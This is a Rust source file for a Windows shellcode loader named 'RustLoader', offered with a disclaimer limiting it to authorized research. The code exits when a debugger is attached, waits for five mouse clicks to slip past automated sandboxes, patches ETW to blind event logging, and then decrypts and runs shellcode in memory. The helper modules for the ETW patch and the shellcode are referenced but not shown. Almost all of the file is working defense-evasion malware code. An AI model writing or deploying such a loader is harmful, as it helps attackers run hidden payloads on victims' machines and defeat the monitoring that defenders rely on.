//! RustLoader - Advanced shellcode loader with anti-debugging and evasion.
//!
//! This loader implements multiple defense-evasion techniques:
//! - Debugger detection via IsDebuggerPresent
//! - Human interaction simulation (mouse click requirement)
//! - ETW patching to blind event tracing
//! - Encrypted shellcode execution from heap memory
//!
//! For authorized security research and penetration testing only.

use std::process;

use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::winuser::{GetAsyncKeyState, VK_LBUTTON};

use crate::patch::patch_etw;
use crate::utils::sleep_millis;

mod patch;
mod shellcode;
mod utils;

const REQUIRED_CLICKS: u32 = 5;

fn main() {
    // Anti-debugging: exit if a debugger is attached
    if unsafe { IsDebuggerPresent() } != 0 {
        process::exit(1);
    }

    // Sandbox evasion: require human interaction before proceeding
    wait_for_clicks(REQUIRED_CLICKS);

    // Patch ETW to prevent event logging
    patch_etw();

    // Decrypt and execute shellcode from memory
    shellcode::execute();
}

/// Waits for a minimum number of mouse clicks before continuing execution.
/// This acts as a sandbox evasion technique — automated analysis environments
/// typically do not simulate real user interaction.
fn wait_for_clicks(min_clicks: u32) {
    let mut count: u32 = 0;

    while count < min_clicks {
        unsafe {
            let state = GetAsyncKeyState(VK_LBUTTON);
            if state & (1 << 15) != 0 {
                count += 1;
                // Wait for button release to avoid counting a single click multiple times
                while GetAsyncKeyState(VK_LBUTTON) & (1 << 15) != 0 {
                    sleep_millis(10);
                }
            }
        }
        sleep_millis(100);
    }
}
